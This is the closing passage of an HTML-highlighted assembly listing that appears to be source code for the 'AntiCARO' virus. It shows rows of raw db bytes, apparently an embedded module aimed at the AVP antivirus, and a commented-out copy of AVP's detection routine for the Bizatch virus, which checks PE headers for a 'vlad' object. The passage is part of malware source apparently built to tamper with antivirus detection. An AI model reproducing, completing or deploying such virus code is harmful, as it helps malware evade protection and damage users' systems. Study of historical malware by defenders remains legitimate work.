        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">6bh</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">79h</span><span class="sc4">,</span><span class="sc2">6fh</span><span class="sc4">,</span><span class="sc2">75h</span><span class="sc4">,</span><span class="sc2">2ch</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">42h</span><span class="sc4">,</span><span class="sc2">6fh</span><span class="sc4">,</span><span class="sc2">6eh</span><span class="sc4">,</span><span class="sc2">74h</span><span class="sc4">,</span><span class="sc2">63h</span><span class="sc4">,</span><span class="sc2">68h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">79h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">98h</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc4">,</span><span class="sc2">86h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">0adh</span><span class="sc4">,</span><span class="sc2">8ch</span><span class="sc4">,</span><span class="sc2">21h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc4">,</span><span class="sc2">5fh</span><span class="sc4">,</span><span class="sc2">50h</span><span class="sc4">,</span><span class="sc2">61h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">67h</span><span class="sc4">,</span><span class="sc2">65h</span><span class="sc4">,</span><span class="sc2">5fh</span><span class="sc4">,</span><span class="sc2">43h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc4">,</span><span class="sc2">5fh</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc4">,</span><span class="sc2">65h</span><span class="sc4">,</span><span class="sc2">61h</span><span class="sc4">,</span><span class="sc2">64h</span><span class="sc4">,</span><span class="sc2">65h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">72h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc2">5fh</span><span class="sc4">,</span><span class="sc2">53h</span><span class="sc4">,</span><span class="sc2">65h</span><span class="sc4">,</span><span class="sc2">65h</span><span class="sc4">,</span><span class="sc2">6bh</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc2">5fh</span><span class="sc4">,</span><span class="sc2">52h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">65h</span><span class="sc4">,</span><span class="sc2">61h</span><span class="sc4">,</span><span class="sc2">64h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">53h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">0eh</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc4">,</span><span class="sc2">5fh</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">64h</span><span class="sc4">,</span><span class="sc2">65h</span><span class="sc4">,</span><span class="sc2">63h</span><span class="sc4">,</span><span class="sc2">6fh</span><span class="sc4">,</span><span class="sc2">64h</span><span class="sc4">,</span><span class="sc2">65h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">97h</span><span class="sc4">,</span><span class="sc2">0a0h</span><span class="sc4">,</span><span class="sc2">8ah</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">1eh</span><span class="sc4">,</span><span class="sc2">55h</span><span class="sc4">,</span><span class="sc2">0bdh</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">8eh</span><span class="sc4">,</span><span class="sc2">0ddh</span><span class="sc4">,</span><span class="sc2">0c4h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">3eh</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">26h</span><span class="sc4">,</span><span class="sc2">8bh</span><span class="sc4">,</span><span class="sc2">6dh</span><span class="sc4">,</span><span class="sc2">3ch</span><span class="sc4">,</span><span class="sc2">33h</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc4">,</span><span class="sc2">50h</span><span class="sc4">,</span><span class="sc2">55h</span><span class="sc4">,</span><span class="sc2">9ah</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">58h</span><span class="sc4">,</span><span class="sc2">58h</span><span class="sc4">,</span><span class="sc2">0c4h</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">0b8h</span><span class="sc4">,</span><span class="sc2">0f8h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">50h</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc4">,</span><span class="sc2">57h</span><span class="sc4">,</span><span class="sc2">9ah</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">83h</span><span class="sc4">,</span><span class="sc2">0c4h</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0c4h</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">26h</span><span class="sc4">,</span><span class="sc2">81h</span><span class="sc4">,</span><span class="sc2">3dh</span><span class="sc4">,</span><span class="sc2">50h</span><span class="sc4">,</span><span class="sc2">45h</span><span class="sc4">,</span><span class="sc2">75h</span><span class="sc4">,</span><span class="sc2">29h</span><span class="sc4">,</span><span class="sc2">26h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">8bh</span><span class="sc4">,</span><span class="sc2">4dh</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc4">,</span><span class="sc2">51h</span><span class="sc4">,</span><span class="sc2">0b8h</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">50h</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc4">,</span><span class="sc2">57h</span><span class="sc4">,</span><span class="sc2">9ah</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">83h</span><span class="sc4">,</span><span class="sc2">0c4h</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc4">,</span><span class="sc2">59h</span><span class="sc4">,</span><span class="sc2">0c4h</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">26h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">81h</span><span class="sc4">,</span><span class="sc2">3dh</span><span class="sc4">,</span><span class="sc2">76h</span><span class="sc4">,</span><span class="sc2">6ch</span><span class="sc4">,</span><span class="sc2">75h</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc4">,</span><span class="sc2">26h</span><span class="sc4">,</span><span class="sc2">81h</span><span class="sc4">,</span><span class="sc2">7dh</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc2">61h</span><span class="sc4">,</span><span class="sc2">64h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">74h</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc4">,</span><span class="sc2">0e2h</span><span class="sc4">,</span><span class="sc2">0dbh</span><span class="sc4">,</span><span class="sc2">33h</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc4">,</span><span class="sc2">5dh</span><span class="sc4">,</span><span class="sc2">1fh</span><span class="sc4">,</span><span class="sc2">0cbh</span><span class="sc4">,</span><span class="sc2">26h</span><span class="sc4">,</span><span class="sc2">0c4h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">7dh</span><span class="sc4">,</span><span class="sc2">14h</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc4">,</span><span class="sc2">57h</span><span class="sc4">,</span><span class="sc2">9ah</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">58h</span><span class="sc4">,</span><span class="sc2">58h</span><span class="sc4">,</span><span class="sc2">0c4h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">3eh</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">0b8h</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">50h</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc4">,</span><span class="sc2">57h</span><span class="sc4">,</span><span class="sc2">9ah</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">83h</span><span class="sc4">,</span><span class="sc2">0c4h</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc4">,</span><span class="sc2">0ebh</span><span class="sc4">,</span><span class="sc2">0dah</span><span class="sc4">,</span><span class="sc2">9ah</span><span class="sc4">,</span><span class="sc2">9ch</span><span class="sc4">,</span><span class="sc2">2dh</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0c8h</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc2">56h</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc2">0c4h</span><span class="sc4">,</span><span class="sc2">09h</span><span class="sc4">,</span><span class="sc2">56h</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc2">0cch</span><span class="sc4">,</span><span class="sc2">14h</span><span class="sc4">,</span><span class="sc2">56h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc2">0c4h</span><span class="sc4">,</span><span class="sc2">1ch</span><span class="sc4">,</span><span class="sc2">56h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">0cch</span><span class="sc4">,</span><span class="sc2">25h</span><span class="sc4">,</span><span class="sc2">56h</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">0c4h</span><span class="sc4">,</span><span class="sc2">2eh</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">56h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">0cch</span><span class="sc4">,</span><span class="sc2">43h</span><span class="sc4">,</span><span class="sc2">56h</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">0c4h</span><span class="sc4">,</span><span class="sc2">4dh</span><span class="sc4">,</span><span class="sc2">56h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">0cch</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">6ch</span><span class="sc4">,</span><span class="sc2">56h</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc2">0c4h</span><span class="sc4">,</span><span class="sc2">74h</span><span class="sc4">,</span><span class="sc2">56h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">0cch</span><span class="sc4">,</span><span class="sc2">7dh</span><span class="sc4">,</span><span class="sc2">56h</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">57h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">8ah</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">74h</span><span class="sc0">
</span><span class="sc5">base_end</span><span class="sc0">        </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc1">; ÄÄ´ Bizatch's detection code ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; biz_dec       segment byte public 'code'</span><span class="sc0">
</span><span class="sc1">;               assume  cs:biz_dec;ds:biz_dec;es:biz_dec;ss:biz_dec</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; _decode       proc    far</span><span class="sc0">
</span><span class="sc1">;               push    ds bp</span><span class="sc0">
</span><span class="sc1">;               mov     bp,seg _Header             ; Get AVP's data segment</span><span class="sc0">
</span><span class="sc1">;               mov     ds,bp</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;               les     di,_Header                 ; Get pointer to header</span><span class="sc0">
</span><span class="sc1">;               mov     bp,word ptr es:[di+3ch]    ; Get PE header offset</span><span class="sc0">
</span><span class="sc1">;               xor     ax,ax</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;               push    ax bp</span><span class="sc0">
</span><span class="sc1">;               call    far ptr _Seek              ; Lseek to PE header</span><span class="sc0">
</span><span class="sc1">;               pop     ax ax                      ; Remove 2 words from stack</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;               les     di,_Page_C                 ; Destination=buffer</span><span class="sc0">
</span><span class="sc1">;               mov     ax,0f8h                    ; Size=f8h bytes</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;               push    ax es di                   ; Read f8h bytes from</span><span class="sc0">
</span><span class="sc1">;               call    far ptr _Read              ; the PE header</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;               add     sp,6                       ; Remove 3 words from stack</span><span class="sc0">
</span><span class="sc1">;               les     di,_Page_C                 ; The call changes ES</span><span class="sc0">
</span><span class="sc1">;               cmp     word ptr es:[di],'EP'      ; Portable Executable?</span><span class="sc0">
</span><span class="sc1">;               jne     back_to_avp</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;               mov     cx,word ptr es:[di+6]      ; Objects number</span><span class="sc0">
</span><span class="sc1">; next_entry:   push    cx</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;               mov     ax,28h                     ; Length of each</span><span class="sc0">
</span><span class="sc1">;               push    ax es di                   ; object table entry</span><span class="sc0">
</span><span class="sc1">;               call    far ptr _Read              ; Read object</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;               add     sp,6                       ; Remove 3 words from stack</span><span class="sc0">
</span><span class="sc1">;               pop     cx</span><span class="sc0">
</span><span class="sc1">;               les     di,_Page_C                 ; Point to our buffer</span><span class="sc0">
</span><span class="sc1">;               cmp     word ptr es:[di],'lv'      ; vl(ad) object?</span><span class="sc0">
</span><span class="sc1">;               jne     search_loop</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;               cmp     word ptr es:[di],'da'      ; (vl)ad object?</span><span class="sc0">
</span><span class="sc1">;               je      lseek_object               ; Bingo! :)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; search_loop:  loop    next_entry                 ; Process next object</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; back_to_avp:  xor     ax,ax                      ; R_CLEAN==0</span><span class="sc0">
</span><span class="sc1">;               pop     bp ds                      ; Return to AVP</span><span class="sc0">
</span><span class="sc1">;               retf</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; lseek_object: les     di,dword ptr es:[di+14h]   ; Lseek to the object</span><span class="sc0">
</span><span class="sc1">;               push    es di                      ; physical offset</span><span class="sc0">
</span><span class="sc1">;               call    far ptr _Seek</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;               pop     ax ax</span><span class="sc0">
</span><span class="sc1">;               mov     ax,0ah                     ; Read ten bytes to</span><span class="sc0">
</span><span class="sc1">;               les     di,_Page_C                 ; our buffer (page C)</span><span class="sc0">
</span><span class="sc1">;               push    ax es di</span><span class="sc0">
</span><span class="sc1">;               call    far ptr _Read</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;               add     sp,6                       ; And now AVP will compare</span><span class="sc0">
</span><span class="sc1">;               jmp     back_to_avp                ; those ten bytes with</span><span class="sc0">
</span><span class="sc1">; _decode       endp                               ; Bizatch's search string</span><span class="sc0">
</span><span class="sc1">; biz_decode    ends</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; public        _decode</span><span class="sc0">
</span><span class="sc1">; extrn         _Page_C:dword                      ; External AVP's API</span><span class="sc0">
</span><span class="sc1">; extrn         _Header:dword                      ; functions and buffers</span><span class="sc0">
</span><span class="sc1">; extrn         _Seek:far                          ; (lseek, read, header,</span><span class="sc0">
</span><span class="sc1">; extrn         _Read:far                          ; read buffer...)</span><span class="sc0">
</span><span class="sc1">; end</span><span class="sc0">

</span><span class="sc5">anticaro_end</span><span class="sc0">    </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc5">anticaro</span><span class="sc0">        </span><span class="sc9">ends</span><span class="sc0">
        </span><span class="sc9">end</span><span class="sc0">     </span><span class="sc5">anticaro_start</span><span class="sc0">
</span></div></body>
</html>
